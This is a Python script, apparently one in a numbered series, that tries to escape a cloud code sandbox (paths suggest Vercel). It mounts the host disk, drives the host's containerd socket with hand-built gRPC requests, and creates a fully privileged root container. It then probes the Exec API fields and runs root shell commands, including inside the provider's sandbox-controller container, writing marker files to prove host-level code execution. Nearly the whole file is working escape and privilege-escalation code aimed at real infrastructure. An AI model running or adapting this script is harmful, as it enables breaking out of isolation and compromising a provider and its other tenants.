# -*- coding: utf-8 -*-
"""vda40_exec_fix: Exec 字段扫描 + 双目标代码执行验证
背景: v39 P6 显示 Tasks/Exec 的字段布局与标准 containerd 不同
  (f1+f2 仍报 exec id cannot be empty, f1+2+3 报 invalid UTF-8)
P0: mount /dev/vda -> /mnt/vdax (宿主 cell 文件系统)
P1: Containers/List -> sandbox-controller 容器 ID + snap_key
P2: 创建 v40pwn 容器 (v38 验证过的方法) + Tasks/Create + Start (sleep 99999)
P3: Exec 字段扫描 (对 v40pwn): field N in 1..15
    扫描A: pstr(N, probe)   分类: exec-id-empty / 其他
    扫描B: pmsg(N, any_spec) 分类: utf8 / wiretype / 接受
P4: 组合完整 Exec (container_id + exec_id + spec):
    Process: /bin/sh -c 'echo v40-exec-ok $(date) >> /mnt/root/.v40_exec_marker'
    Exec 创建 exec 进程 -> Start -> 验证 marker
P5: 对 sandbox-controller 容器尝试同法 Exec (若 exec_id 字段已知)
    写 /mnt/root/.v40_ctrl_marker 验证
输出落盘 + 哨兵 V40S_DONE"""
import os, time, socket, ctypes, re, struct, subprocess, json, base64

OUT = '/vercel/sandbox/v40s.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def curl_h2(sockpath, path, body, ctype='application/grpc', t=6, ns='default'):
    try:
        tmp = '/vercel/sandbox/curl_req_%d.bin' % os.getpid()
        hdr = '/vercel/sandbox/curl_hdr_%d.txt' % os.getpid()
        open(tmp, 'wb').write(body)
        cmd = ['curl', '-sS', '--max-time', str(t), '--http2-prior-knowledge',
               '--unix-socket', sockpath, '-X', 'POST',
               '-H', 'Content-Type: %s' % ctype, '-H', 'TE: trailers']
        if ns:
            cmd += ['-H', 'containerd-namespace: %s' % ns]
        cmd += ['-D', hdr, '--data-binary', '@%s' % tmp, 'http://unix%s' % path]
        r = subprocess.run(cmd, capture_output=True, timeout=t + 2)
        hdrtxt = ''
        try:
            hdrtxt = open(hdr, encoding='utf-8', errors='replace').read().replace('\n', ' | ')[:300]
        except Exception:
            pass
        return 'rc=%d HDR:%s' % (r.returncode, hdrtxt), r.stdout
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, b''


def grpc_env(payload=b''):
    return b'\x00' + struct.pack('>I', len(payload)) + payload


def pvarint(n):
    out = bytearray()
    while n > 127:
        out.append((n & 127) | 128)
        n >>= 7
    out.append(n)
    return bytes(out)


def pstr(field_no, s):
    b = s.encode() if isinstance(s, str) else s
    return pvarint((field_no << 3) | 2) + pvarint(len(b)) + b


def pmsg(field_no, payload):
    return pvarint((field_no << 3) | 2) + pvarint(len(payload)) + payload


def pbool(field_no, v):
    return pvarint((field_no << 3)) + (b'\x01' if v else b'\x00')


def show(tag, out, raw=False):
    if not out:
        log('%s -> EMPTY' % tag)
        return
    if raw:
        log('%s -> %s' % (tag, out[:400].decode('utf-8', errors='replace').replace('\n', ' ')))
        return
    strs = re.findall(rb'[\x20-\x7e]{4,}', out)
    log('%s -> %s' % (tag, [s.decode(errors='replace') for s in strs[:20]]))


CSP = '/mnt/vdax/run/containerd/containerd.sock'
IMAGE = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'
CID = 'v40pwn'
TASKDIR = '/mnt/vdax/run/containerd/io.containerd.runtime.v2.task/default/%s' % CID


def p1():
    log('=== P1 list + residue ===')
    rc, out = curl_h2(CSP, '/containerd.services.containers.v1.Containers/List', grpc_env(b''), t=4)
    log('Containers/List %s' % rc)
    show('Containers body', out)
    ctrl = None
    m = re.search(rb'\$([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', out)
    if m:
        ctrl = m.group(1).decode()
        log('ctrl container id = %s' % ctrl)
    m2 = re.search(rb'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}-snapshot', out)
    sk = m2.group().decode() if m2 else None
    log('snap_key=%s' % sk)
    return ctrl, sk


def make_spec(args):
    caps = ["CAP_AUDIT_CONTROL", "CAP_AUDIT_READ", "CAP_AUDIT_WRITE", "CAP_BLOCK_SUSPEND", "CAP_BPF",
            "CAP_CHECKPOINT_RESTORE", "CAP_CHOWN", "CAP_DAC_OVERRIDE", "CAP_DAC_READ_SEARCH", "CAP_FOWNER",
            "CAP_FSETID", "CAP_IPC_LOCK", "CAP_IPC_OWNER", "CAP_KILL", "CAP_LEASE", "CAP_LINUX_IMMUTABLE",
            "CAP_MAC_ADMIN", "CAP_MAC_OVERRIDE", "CAP_MKNOD", "CAP_NET_ADMIN", "CAP_NET_BIND_SERVICE",
            "CAP_NET_BROADCAST", "CAP_NET_RAW", "CAP_PERFMON", "CAP_SETFCAP", "CAP_SETGID", "CAP_SETPCAP",
            "CAP_SETUID", "CAP_SYS_ADMIN", "CAP_SYS_BOOT", "CAP_SYS_CHROOT", "CAP_SYS_MODULE", "CAP_SYS_NICE",
            "CAP_SYS_PACCT", "CAP_SYS_PTRACE", "CAP_SYS_RAWIO", "CAP_SYS_RESOURCE", "CAP_SYS_TIME",
            "CAP_SYS_TTY_CONFIG", "CAP_SYSLOG", "CAP_WAKE_ALARM"]
    return {
        "ociVersion": "1.0.2",
        "process": {
            "user": {"uid": 0, "gid": 0},
            "args": args,
            "env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
                    "V40_PWNED=1"],
            "cwd": "/",
            "capabilities": {
                "bounding": caps, "effective": caps, "permitted": caps, "ambient": caps
            }
        },
        "root": {"path": "rootfs"},
        "mounts": [
            {"destination": "/proc", "type": "proc", "source": "proc"},
            {"destination": "/dev", "type": "bind", "source": "/dev", "options": ["rbind", "rw"]},
            {"destination": "/bin", "type": "bind", "source": "/bin", "options": ["rbind", "ro"]},
            {"destination": "/usr", "type": "bind", "source": "/usr", "options": ["rbind", "ro"]},
            {"destination": "/lib", "type": "bind", "source": "/lib", "options": ["rbind", "ro"]},
            {"destination": "/lib64", "type": "bind", "source": "/lib64", "options": ["rbind", "ro"]},
            {"destination": "/etc", "type": "bind", "source": "/etc", "options": ["rbind", "ro"]}
        ],
        "linux": {
            "resources": {"devices": [{"allow": True, "access": "rwm"}]},
            "cgroupsPath": "/v40pwn-ctr",
            "namespaces": [
                {"type": "mount"}, {"type": "pid"}, {"type": "uts"}, {"type": "ipc"}
            ]
        }
    }


def p2(sk):
    log('=== P2 Create v40pwn ===')
    spec = make_spec(["/bin/sh", "-c", "sleep 99999"])
    spec_json = json.dumps(spec).encode()
    runtime = pstr(1, 'io.containerd.runc.v2')
    any_spec = pstr(1, 'types.containerd.io/opencontainers/runtime-spec/1/Spec') + pstr(2, spec_json)
    ctr = pstr(1, CID) + pstr(3, IMAGE) + pmsg(4, runtime) + pmsg(5, any_spec)
    ctr += pstr(6, 'overlayfs')
    if sk:
        ctr += pstr(7, sk)
    req = pmsg(1, ctr)
    rc, out = curl_h2(CSP, '/containerd.services.containers.v1.Containers/Create', grpc_env(req), t=6)
    log('Containers/Create %s' % rc)
    if 'grpc-status: 0' not in rc:
        return False
    req = pstr(1, CID)
    rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Create', grpc_env(req), t=8)
    log('Tasks/Create %s' % rc)
    if 'grpc-status: 0' not in rc:
        return False
    rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Start', grpc_env(req), t=8)
    log('Tasks/Start %s' % rc)
    return 'grpc-status: 0' in rc


def classify(rc):
    """提取 grpc-status / grpc-message"""
    m = re.search(r'grpc-status: (\d+)', rc)
    s = m.group(1) if m else '?'
    m = re.search(r'grpc-message: ([^|]*)', rc)
    msg = m.group(1).strip() if m else ''
    return s, msg


def p3():
    """Exec 字段扫描 (对运行中的 v40pwn)"""
    log('=== P3 Exec field scan ===')
    found = {}
    # 扫描A: 单 string 字段
    for n in range(1, 16):
        body = pstr(1, CID) + pstr(n, 'probe40_f%d' % n)
        rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Exec', grpc_env(body), t=4)
        s, msg = classify(rc)
        log('scanA f%d -> status=%s msg=%s' % (n, s, msg[:80]))
        found[n] = (s, msg)
        # 若不再报 exec id empty, 记录候选
        if s == '0' or 'exec id cannot be empty' not in msg:
            log('*** CANDIDATE exec_id field = %d (status=%s msg=%s)' % (n, s, msg[:80]))
    # 扫描B: message 字段 (Any spec)
    proc = {"user": {"uid": 0, "gid": 0}, "args": ["/bin/true"], "env": ["PATH=/bin"], "cwd": "/"}
    any_spec = pstr(1, 'types.containerd.io/opencontainers/runtime-spec/1/Spec') + pstr(2, json.dumps(proc).encode())
    for n in range(1, 16):
        body = pstr(1, CID) + pmsg(n, any_spec)
        rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Exec', grpc_env(body), t=4)
        s, msg = classify(rc)
        log('scanB f%d -> status=%s msg=%s' % (n, s, msg[:80]))
    return found


def exec_marker(exec_field, spec_field):
    """完整 Exec: 创建 exec 进程写 marker, Start 启动, 验证"""
    log('=== P4 exec_marker (exec_field=%d spec_field=%d) ===' % (exec_field, spec_field))
    proc = {"user": {"uid": 0, "gid": 0},
            "args": ["/bin/sh", "-c",
                     "mkdir -p /mnt; mount /dev/vda /mnt 2>/dev/null; "
                     "echo v40-exec-ok $(date) >> /mnt/root/.v40_exec_marker 2>/dev/null; "
                     "sleep 5"],
            "env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],
            "cwd": "/", "terminal": False}
    any_spec = pstr(1, 'types.containerd.io/opencontainers/runtime-spec/1/Spec') + pstr(2, json.dumps(proc).encode())
    req = pstr(1, CID) + pstr(exec_field, 'ex40a') + pmsg(spec_field, any_spec)
    # stdin/stdout/stderr 尝试标准 4/5/6
    req += pbool(4, True) + pbool(5, True) + pbool(6, True) + pbool(7, False)
    rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Exec', grpc_env(req), t=8)
    log('Exec full %s' % rc)
    show('Exec body', out, raw=True)
    if 'grpc-status: 0' not in rc:
        return False
    # Start: field1=container_id? field2=exec_id? 标准 StartRequest 是 container_id=1, exec_id=2
    req = pstr(1, CID) + pstr(2, 'ex40a')
    rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Start', grpc_env(req), t=8)
    log('Start ex40a %s' % rc)
    time.sleep(3)
    try:
        mk = '/mnt/vdax/root/.v40_exec_marker'
        log('v40 exec marker: %s' % (os.path.exists(mk) and open(mk).read().strip() or 'MISSING'))
    except Exception as e:
        log('marker ERR %s' % e)
    return True


def p5(ctrl, exec_field, spec_field):
    """对 sandbox-controller 容器 Exec (若字段已知)"""
    log('=== P5 ctrl exec attempt ===')
    if not ctrl:
        log('no ctrl id, skip')
        return
    proc = {"user": {"uid": 0, "gid": 0},
            "args": ["/bin/sh", "-c",
                     "mkdir -p /mnt; mount /dev/vda /mnt 2>/dev/null; "
                     "echo v40-ctrl-exec-ok $(date) >> /mnt/root/.v40_ctrl_marker 2>/dev/null; "
                     "sleep 3"],
            "env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],
            "cwd": "/", "terminal": False}
    any_spec = pstr(1, 'types.containerd.io/opencontainers/runtime-spec/1/Spec') + pstr(2, json.dumps(proc).encode())
    req = pstr(1, ctrl) + pstr(exec_field, 'ex40c') + pmsg(spec_field, any_spec)
    req += pbool(4, True) + pbool(5, True) + pbool(6, True) + pbool(7, False)
    rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Exec', grpc_env(req), t=8)
    log('ctrl Exec %s' % rc)
    if 'grpc-status: 0' in rc:
        req = pstr(1, ctrl) + pstr(2, 'ex40c')
        rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Start', grpc_env(req), t=8)
        log('ctrl Start %s' % rc)
        time.sleep(3)
        try:
            mk = '/mnt/vdax/root/.v40_ctrl_marker'
            log('ctrl marker: %s' % (os.path.exists(mk) and open(mk).read().strip() or 'MISSING'))
        except Exception as e:
            log('ctrl marker ERR %s' % e)


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)

    ctrl, sk = p1()
    ok = p2(sk)
    if ok:
        found = p3()
        # 从扫描结果选 exec_id 字段: 第一个 status 不是 empty 报错的
        exec_field = None
        spec_field = 3
        for n in sorted(found):
            s, msg = found[n]
            if s == '0' or 'exec id cannot be empty' not in msg:
                exec_field = n
                break
        if exec_field:
            log('*** using exec_field=%d' % exec_field)
            exec_marker(exec_field, spec_field)
            p5(ctrl, exec_field, spec_field)
        else:
            log('NO exec_id field found in scan')
    else:
        log('v40pwn create failed, skip P3+')

    log('V40S_DONE')
    f.close()


if __name__ == '__main__':
    main()
